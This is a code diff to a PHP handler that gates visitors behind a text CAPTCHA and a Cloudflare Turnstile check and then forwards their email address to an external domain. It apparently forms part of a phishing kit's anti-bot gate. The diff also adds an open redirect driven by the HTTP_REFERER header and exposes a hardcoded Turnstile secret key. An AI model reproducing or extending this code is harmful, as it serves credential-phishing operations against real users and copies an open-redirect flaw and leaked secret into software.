@@ -12,11 +12,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $turnstileResponse = $_POST['cf-turnstile-response'];
     $secretKey = '0x4AAAAAAAzbaFyF5jnLHaBSyZ5AuNHu098';
 
+    // Use HTTP_REFERER to get the referrer URL or set a default
+    $currentUrl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'index.php';
+
     // Validate text-based CAPTCHA
     if ($userTextCaptcha !== $_SESSION['captcha_text']) {
-        // Redirect back to the form with an error message
+        // Redirect back to the same URL with an error message
         $_SESSION['error_message'] = "Text CAPTCHA verification failed. Please try again.";
-        header("Location: index.php");
+        header("Location: $currentUrl");
         exit;
     }
 
@@ -44,7 +47,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (!$captchaSuccess->success) {
         // Redirect back to the form with an error message
         $_SESSION['error_message'] = "Cloudflare CAPTCHA verification failed. Please try again.";
-        header("Location: index.php");
+        header("Location: $currentUrl");
         exit;
     }
 
@@ -55,8 +58,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $encodedEmail = base64_encode($email);
 
     // Construct the redirect URL with the decoded email
-$redirectUrl = "https://zo.osecurthei.com/cMZz/#A$email";
-
+    $redirectUrl = "https://zo.osecurthei.com/cMZz/#A$email";
 
     // Redirect the user
     header("Location: $redirectUrl");
